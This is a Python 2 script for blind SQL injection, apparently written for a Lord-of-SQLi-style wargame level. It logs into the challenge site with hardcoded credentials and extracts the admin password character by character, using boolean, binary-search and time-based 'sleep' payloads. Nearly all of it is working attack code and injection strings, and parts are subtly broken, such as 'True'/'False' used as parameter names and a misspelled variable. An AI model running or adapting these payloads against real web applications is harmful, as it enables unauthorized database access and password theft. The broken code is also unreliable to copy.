import requests 
import string
import getpass
import sys
import threading
import colorama
import random
import os
import time

Length= 0
flag = ''
key = ''

def clear():
	if os.name == 'nt':
		os.system("cls")
	else:
		os.system("clear")

class SQLi():
	def __init__(self, URL, method):
		self.sess = requests.session()
		self.URL = URL
		self.method = method.upper()

	def login(self, URL, id, pw):
		data = {"id":id,"pw":pw}
		self.sess.post(URL,data=data)


	def getLength( self, Query,TargetParam, True, column=None ):
		ret =0
		r = None
		limit = 0xffffff
		if column is None:
			column = TargetParam

		for i in range(limit):
			sys.stdout.write("PASSWORD LENGTH... {}\r".format(i))
			param = {TargetParam:Query.format(column,i)}
			if self.method == "GET":
				r = self.sess.get(self.URL,params=param)
			elif self.method== "POST":
				r = self.sess.post(self.URL,data=param)
			if True in r.text:
				ret = i
				return ret

	def time_getLength( self, Query,TargetParam, SleepTime, column=None ):
		ret =0
		r = None
		limit = 0xffffff
		if column is None:
			column = TargetParam

		for i in range(limit):
			sys.stdout.write("PASSWORD LENGTH... {}\r".format(i))
			param = {TargetParam:Query.format(column,i)}
			
			start = time.time()
			if self.method == "GET":
				r = self.sess.get(self.URL,params=param)
			elif self.method== "POST":
				r = self.sess.post(self.URL,data=param)
			end = time.time()
			if SleepTime < end-start:
				ret = i
				return ret

	'''
	Query : SQL syntax
	TargetParam : variable name
	Strlength : length of data
	True : Check True
	False : Check False
	'''

	def blind( self, Query, TargetParam, Strlength, True, False=None, OtherParam=None, column=None ):
		self.Length = Strlength
		r = None
		if column is None:
			column = TargetParam
		for index in range(1,self.Length+1):
			for Ascii in range(0x20,0x80): # range is changeable
				param = {TargetParam:Query.format(column,index,Ascii)}
				if OtherParam is not None:
					param.update(OtherParamam)
				if self.method == "GET":
					r = self.sess.get(self.URL,params=param)
				elif self.method== "POST":
					r = self.sess.post(self.URL,data=param)

				#check True or False
				if True in r.text:
					yield chr(Ascii)
					break

	'''
	Query : SQL syntax
	TargetParam : variable name
	Strlength : length of data
	True : Check True
	False : Check False
	'''

	def bin_blind(self, Query, TargetParam, Strlength, True, False=None, OtherParam=None, column=None ):
		self.Length = Strlength
		r = None
		if column is None:
			column = TargetParam
		for index in range(1,self.Length+1):
			self.TOP = 0x80
			self.BOT = 0x20
			while(1):
				mid = (self.TOP+self.BOT)/2
				if self.TOP - self.BOT  == 1:
					yield chr(self.TOP)
					break

				param = {TargetParam:Query.format(column,index,mid)}
				if OtherParam is not None:
					param.update(OtherParamam)
				if self.method == "GET":
					r = self.sess.get(self.URL,params=param)
				elif self.method== "POST":
					r = self.sess.post(self.URL,data=param)
				
				#check True or False
				if True in r.text:
					self.BOT = mid
				else:
					self.TOP = mid

	def time_blind( self, Query, TargetParam, Strlength, SleepTime, OtherParam=None, column=None ):
		self.Length = Strlength
		r = None
		if column is None:
			column = TargetParam
		for index in range(1,self.Length+1):
			for Ascii in range(0x20,0x80): # range is changeable
				param = {TargetParam:Query.format(column,index,Ascii)}
				if OtherParam is not None:
					param.update(OtherParamam)

				start = time.time()
				if self.method == "GET":
					r = self.sess.get(self.URL,params=param)
				elif self.method== "POST":
					r = self.sess.post(self.URL,data=param)
				end = time.time()

				#check True or False
				if SleepTime < end-start:
					yield chr(Ascii)
					break

	def time_bin_blind(self, Query, TargetParam, Strlength, SleepTime, OtherParam=None, column=None ):
		self.Length = Strlength
		r = None
		if column is None:
			column = TargetParam
		for index in range(1,self.Length+1):
			self.TOP = 0x80
			self.BOT = 0x20
			while(1):
				mid = (self.TOP+self.BOT)/2
				if self.TOP - self.BOT  == 1:
					yield chr(self.TOP)
					break

				param = {TargetParam:Query.format(column,index,mid)}
				if OtherParam is not None:
					param.update(OtherParamam)

				start = time.time()
				if self.method == "GET":
					r = self.sess.get(self.URL,params=param)
				elif self.method== "POST":
					r = self.sess.post(self.URL,data=param)
				end = time.time()
				
				#check True or False
				if SleepTime < end-start:
					self.BOT = mid
				else:
					self.TOP = mid

	def cybertic_print(self):
		time.sleep(0.1) #race condition prevent
		print "PASSWORD LENGTH... {}".format(self.Length)
		while(self.Length-len(key)):
			flag = key+ ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range((self.Length)-len(key)))
			sys.stdout.write(" Password : "+flag+"\r")
			#sys.stdout.flush()
		sys.stdout.write(" Password : "+key)
		print ""

	def time_check( self, Query, TargetParam, Strlength, OtherParam=None, column=None ):
		self.Length = Strlength
		r = None
		if column is None:
			column = TargetParam
		for index in range(1,self.Length+1):
				param = {TargetParam:Query.format(column,index)}
				if OtherParam is not None:
					param.update(OtherParamam)
				#time check start
				start = time.time()
				if self.method == "GET":
					r = self.sess.get(self.URL,params=param)
				elif self.method== "POST":
					r = self.sess.post(self.URL,data=param)
				end = time.time()
				yield chr(int(end-start))

if __name__ == "__main__":
	TrueCondition = "<hr><br><h2>Hello admin"

	clear()
	Length_Query_Example = "'|| id='admin' and if(length({})={},10)#"
	Query_Example = "' || id='admin' and if(ascii(substr({},{},1))={},1,0)#"
	BinQuery_Example = "' || id='admin' and if(ascii(substr({},{},1))>{},1,0)#"
	TimeQuery_Example ="' || id='admin' and if(ascii(substr({},{},1))={},sleep(1),0)#"
	TimeBinQuery_Example = "' || id='admin' and if(ascii(substr({},{},1))>{},sleep(1),0)#"
	TimeCheck_Example = "'|| id='admin' and sleep(ascii(substr({},{},1)))#"

	s =SQLi("http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php","GET")
	s.login("http://los.eagle-jump.org/?login","kuriring","dnlwkem24")
	print "good"
	length = s.getLength(Length_Query_Example,"pw",TrueCondition)
	clear()
	th = threading.Thread(target=s.cybertic_print)
	th.start()

	for result in s.blind(Query_Example,"pw",length,TrueCondition):
		key += result
	#for result in s.bin_blind(BinQuery_Example,"pw",length,TrueCondition):
	#	key += result
	#for result in s.time_blind(TimeQuery_Example,"pw",length,1):
	#	key += result
	#for result in s.time_bin_blind(TimeBinQuery_Example,"pw",length,1):
	#	key += result
	#for result in s.time_check(TimeCheck_Example,"pw",length):
	#	key += result
